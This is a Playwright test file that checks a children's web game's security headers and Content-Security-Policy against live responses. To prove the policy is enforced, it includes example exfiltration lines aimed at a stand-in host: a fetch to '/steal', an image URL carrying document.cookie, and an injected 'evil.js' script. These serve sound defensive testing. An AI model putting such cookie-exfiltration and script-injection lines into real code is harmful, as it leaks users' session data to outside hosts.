import { type Page, expect, test } from '@playwright/test';
import { answerCurrentProblem, createTrainer } from './helpers';

/**
 * The security headers, tested against a socket rather than a config.
 *
 * `scripts/audit_headers.py` proves the policy in `next.config.ts` parses and
 * says what it should. It cannot prove a browser is ever told any of it - and
 * a header that exists only in a config is not a header. That is this file's
 * whole job, and it is not a hypothetical concern: this app shipped for its
 * entire life with three headers and no Content-Security-Policy at all, and
 * nothing anywhere would have noticed if the CSP had been added to the wrong
 * branch of that config, or attached to a `source` that matched no route.
 *
 * So these tests do three separate things, and all three are needed:
 *
 *   1. Read the headers off real responses - a document, a build asset and an
 *      API route.
 *   2. Prove the policy is ENFORCED, not merely present. A malformed or
 *      inert policy still shows up in `response.headers()`. The only honest
 *      proof is to try something the policy forbids and watch it be refused.
 *   3. Prove the app still works underneath it, cold and warm.
 *
 * The COLD pass in (3) is the load-bearing one and the reason this file does
 * not simply reuse `createTrainer`. Once a profile exists, React re-renders
 * through CSSOM, and CSSOM writes are invisible to CSP - so a policy that
 * breaks the server-rendered shell looks perfectly clean if every test starts
 * by onboarding. That false green was observed while choosing this policy:
 * `style-src 'self'` produced zero violations across a full seeded playthrough
 * and one refusal on a first un-onboarded load of /album.
 */

/** Every route a child can reach without an account. */
const ROUTES = ['/', '/start', '/play', '/album', '/progress', '/settings', '/login'];

/**
 * The exact policy `next.config.ts` builds. Spelled out here rather than
 * imported so that this test disagrees with the config when the config
 * changes, instead of agreeing with whatever it happens to say.
 */
const EXPECTED_CSP = [
  "default-src 'self'",
  "base-uri 'self'",
  "object-src 'none'",
  "frame-src 'none'",
  "frame-ancestors 'none'",
  "form-action 'self'",
  "script-src 'self' 'unsafe-inline'",
  "script-src-attr 'none'",
  "style-src 'self' 'unsafe-inline'",
  "img-src 'self'",
  "font-src 'self'",
  "media-src 'none'",
  "connect-src 'self'",
  "worker-src 'self'",
  "manifest-src 'self'",
].join('; ');

const EXPECTED_HEADERS: Record<string, string> = {
  'content-security-policy': EXPECTED_CSP,
  'cross-origin-opener-policy': 'same-origin',
  'referrer-policy': 'strict-origin-when-cross-origin',
  'x-content-type-options': 'nosniff',
  'x-frame-options': 'DENY',
};

/**
 * Collects every CSP refusal the browser logs, for the life of the page.
 *
 * Matched on "Content Security Policy" rather than on "Refused to", which is
 * how this was first written and was wrong: Chromium also says "Refused to
 * execute script ... MIME type ('text/plain')" when a chunk 404s because a
 * rebuild landed underneath a running server. That is a stale-server symptom,
 * not a policy violation, and letting it in here would have made this spec
 * flaky and - worse - would have taught whoever hit it that a red CSP test is
 * usually noise. Every Chromium CSP message names the policy.
 */
function watchForRefusals(page: Page): string[] {
  const refusals: string[] = [];
  page.on('console', (message) => {
    const text = message.text();
    if (/Content Security Policy/.test(text)) refusals.push(text);
  });
  return refusals;
}

test.describe('security headers', () => {
  test('every header reaches the browser on a real response', async ({ page }) => {
    const response = await page.goto('/start');
    expect(response, 'no response for /start').not.toBeNull();

    const headers = response!.headers();
    for (const [name, value] of Object.entries(EXPECTED_HEADERS)) {
      expect(headers[name], `${name} on the document response`).toBe(value);
    }

    // Permissions-Policy is asserted by capability rather than by exact string,
    // so adding a newly denied capability does not fail this test - but
    // granting one of these back does.
    const permissions = headers['permissions-policy'] ?? '';
    for (const capability of ['camera', 'microphone', 'geolocation', 'payment']) {
      expect(permissions, `${capability} must be denied`).toContain(`${capability}=()`);
    }

    // `source: '/:path*'` is supposed to mean every path. Check something that
    // is not a page: a build asset served straight off disk.
    const assetUrl = await page.evaluate(() => {
      const script = document.querySelector<HTMLScriptElement>('script[src*="/_next/static/"]');
      return script?.src ?? null;
    });
    expect(assetUrl, 'no build asset on the page to check').not.toBeNull();
    const asset = await page.request.get(assetUrl!);
    expect(asset.headers()['content-security-policy']).toBe(EXPECTED_CSP);

    // And a route handler, which answers from code rather than from the static
    // pipeline and could plausibly bypass the config's headers.
    const api = await page.request.get('/api/session');
    expect(api.headers()['content-security-policy']).toBe(EXPECTED_CSP);
  });

  test('the policy is enforced, not merely present', async ({ page }) => {
    const refusals = watchForRefusals(page);
    await page.goto('/start');

    /*
     * Three things the policy forbids, each attempted for real.
     *
     * The assertion is on the browser's own `securitypolicyviolation` events
     * rather than on whether the load succeeded, and that is deliberate: with
     * no CSP at all, a sandbox with no outbound network fails these requests
     * anyway, so "it did not load" proves nothing about the policy. Only the
     * violation event - which names the directive that did the refusing -
     * distinguishes "CSP stopped it" from "the network was not there". It is
     * also instant, where waiting on a cross-origin timeout is not.
     */
    const directives = await page.evaluate(async () => {
      const seen: string[] = [];
      document.addEventListener('securitypolicyviolation', (event) => {
        seen.push(event.effectiveDirective);
      });

      // connect-src 'self'. The directive the whole policy leans on: with
      // 'unsafe-inline' in script-src an injected script can run, so what has
      // to hold is that it cannot send anything anywhere.
      void fetch('https://example.com/steal', { mode: 'no-cors' }).catch(() => {});

      // img-src 'self'. The exfiltration channel that needs no fetch at all:
      // `new Image().src = '//attacker/?' + document.cookie`.
      const image = new Image();
      image.src = 'https://example.com/pixel.png?x=' + document.cookie;

      // script-src carries no origin, so a third-party script - the shape of
      // most real XSS payloads - cannot load even though inline script can.
      const script = document.createElement('script');
      script.src = 'https://example.com/evil.js';
      document.head.append(script);

      await new Promise((resolve) => setTimeout(resolve, 500));
      return seen;
    });

    expect(directives, 'connect-src did not refuse a cross-origin fetch').toContain('connect-src');
    expect(directives, 'img-src did not refuse a cross-origin image').toContain('img-src');
    // Chromium names the *effective* directive, which for a <script> element
    // is always script-src-elem - even though this policy never declares one
    // and the refusal actually came from script-src by fallback. Asserting the
    // literal string 'script-src' therefore fails against a policy that is
    // working perfectly, which is exactly what it did when this was written.
    expect(
      directives.some((directive) => directive === 'script-src' || directive === 'script-src-elem'),
      `a third-party script was not refused (directives seen: ${directives.join(', ')})`,
    ).toBe(true);

    expect(
      refusals.length,
      'the browser logged no CSP refusals at all, so nothing above was enforced',
    ).toBeGreaterThan(0);
  });

  test('a cold, un-onboarded load of every route raises no violation', async ({ page }) => {
    // No profile and no service worker: the server-rendered shell exactly as a
    // child sees it the first time, which is the only pass where the shell's
    // own inline style attributes are parsed by the HTML parser.
    const refusals = watchForRefusals(page);

    for (const route of ROUTES) {
      await page.goto(route, { waitUntil: 'networkidle' });
      // Not merely a 200: a page that rendered. A blocked bootstrap script
      // leaves the HTML painted and nothing else, so length is the tell.
      const rendered = await page.evaluate(() => document.body.innerText.trim().length);
      expect(rendered, `${route} came back effectively blank`).toBeGreaterThan(40);
    }

    expect(refusals, 'the CSP refused something on a first load').toEqual([]);
  });

  test('the game is playable under the policy', async ({ page }) => {
    const refusals = watchForRefusals(page);

    await createTrainer(page, 'Leo', 'cindik');

    await page.getByTestId('tile-play').click();
    await page.locator('[data-testid^="opponent-"]').first().click();
    await expect(page.getByTestId('battle')).toBeVisible();
    await page.getByTestId('move-strong').click();

    // Let the speed meter drain for a beat before answering. It is the one
    // thing on screen that animates continuously off a per-frame style write,
    // so it is where a style-src mistake would surface if anywhere.
    await expect(page.getByTestId('problem')).toBeVisible();
    await page.waitForTimeout(1_500);
    await answerCurrentProblem(page);
    await expect(page.getByText(/Correct!|Critical hit!/)).toBeVisible();

    // The service worker is fetched and registered under the policy too -
    // worker-src 'self' - and offline play depends on it.
    await page.waitForFunction(() => !!navigator.serviceWorker?.controller, null, {
      timeout: 20_000,
    });

    expect(refusals, 'the CSP refused something during a battle').toEqual([]);
  });
});
